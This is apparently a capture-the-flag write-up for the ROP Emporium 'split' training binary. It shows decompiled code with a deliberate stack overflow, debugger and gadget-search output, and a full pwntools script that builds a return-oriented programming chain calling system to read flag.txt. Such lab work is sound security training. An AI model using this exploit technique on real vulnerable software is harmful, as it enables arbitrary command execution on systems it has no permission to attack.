# Split

## Reversing with Ghidra
### Main
```c
int main() {
  puts("split by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```
### Pwnme
```c
void pwnme() {
  char input[32];
  
  memset(input, 0, 0x20);
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  read(0, input, 0x60);
  puts("Thank you!");
  return;
}
```
### Useful Function
```c
void usefulFunction() {
  system("/bin/ls");
  return;
}
```

## The vuln
We can exploit the `buffer overflow` with a `ROPChain` that use a call to `system`, the string `/bin/cat flag.txt` (which is inside the binary) and the gadget `pop rdi; ret`, found with `ropper`.

## The exploit
### Find the address of the string "/bin/cat flag.txt"
```
pwndbg> search "/bin/cat flag.txt"
split           0x601060 '/bin/cat flag.txt'
```
### Find the address of the call to "system"
```
pwndbg> disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:     push   rbp
   0x0000000000400743 <+1>:     mov    rbp,rsp
   0x0000000000400746 <+4>:     mov    edi,0x40084a
   0x000000000040074b <+9>:     call   0x400560 <system@plt>
   0x0000000000400750 <+14>:    nop
   0x0000000000400751 <+15>:    pop    rbp
   0x0000000000400752 <+16>:    ret    
End of assembler dump.
```
### Find the gadget "pop rdi; ret"
```
(ropper)> file split
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
(split/ELF/x86_64)> search pop rdi
[INFO] Searching for gadgets: pop rdi

[INFO] File: split
0x00000000004007c3: pop rdi; ret; 

(split/ELF/x86_64)>
```
### Putting all together
```python
from pwn import *

#
# Context
#

e = context.binary = ELF('split')

#
# ROP
#

# Use pwntools to find gadgets and strings
BINCAT = p64(next(e.search(b'/bin/cat flag.txt'))) # "/bin/cat flag.txt"
SYSTEM = p64(e.symbols["usefulFunction"] + 9) # call system; <junk>
POPRDI = p64(next(e.search(asm('pop rdi; ret'))))

#
# Offset
#

offset = 0

io = process(e.path)

io.sendlineafter(b'> ', cyclic(0x60))
io.wait()

core = io.corefile

io.close()

offset = cyclic_find(core.read(core.rsp, 4))
info(f'Offset: {offset}')

#
# Exploit
#

payload  = b''
payload += b'A' * offset
payload += POPRDI
payload += BINCAT
payload += SYSTEM

with open('payload', 'wb') as fout:
    fout.write(payload)

io = process(e.path)

io.sendlineafter(b'> ', payload)
info(io.recvuntil(b'}').decode())
io.close()
```